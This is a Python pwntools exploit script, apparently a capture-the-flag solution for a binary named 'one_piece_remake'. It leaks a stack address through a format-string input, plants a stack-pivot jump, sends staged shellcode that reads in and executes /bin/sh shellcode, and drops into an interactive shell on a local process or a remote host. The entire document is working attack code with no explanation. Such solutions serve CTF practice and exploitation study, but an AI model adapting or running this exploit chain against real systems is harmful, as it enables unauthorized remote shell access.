#!/usr/bin/env python3

import sys
from pwn import *

context.arch = "i386"

DEBUG = False
if len(sys.argv) > 1 and sys.argv[1] == "debug":
    DEBUG = True

LOCAL = True
if len(sys.argv) > 2:
    LOCAL = False

binary = ELF("./one_piece_remake")
stack_pivot_addr = binary.symbols["sc"]

if LOCAL:
    target = binary.process()
    if DEBUG:
        pause()
else:
    target = remote(sys.argv[1], sys.argv[2])

target.recvuntil(">>")

# Start by leaking stack address
target.sendline("gomugomunomi")
target.recvuntil(">>")

target.sendline("%p")
stack_addr = int(target.recvuntil("\n", drop=True), 16)
print(f"Stack addr: {hex(stack_addr)}")

# Store stack pivot shellcode
stack_pivot = b"\xe9" + p32(
    stack_addr - stack_pivot_addr - 5
)  # Subtract 5 for the jmp instr length

target.sendline("read")
target.send(stack_pivot)

# Setup second stage shellcode
second_stage = asm(shellcraft.i386.linux.sh())

# Read in first stage shellcode
first_stage = asm(
    f"""
    xor ebx, ebx
    imul ebx
    mov ecx, {stack_addr + 0x10}
    mov dl, {len(second_stage)}
    mov al, 3
    int 0x80
    """
)

first_stage += b"\x90" * (0x10 - len(first_stage))

target.sendline("gomugomunomi")
target.recvuntil(">>")

target.sendline(first_stage)

# Run stack pivot & first stage
target.recvuntil(">>")
target.recvuntil(">>")
target.recvuntil(">>")
target.sendline("run")

# Read and execute in final stage shellcode
target.send(second_stage)

target.interactive()
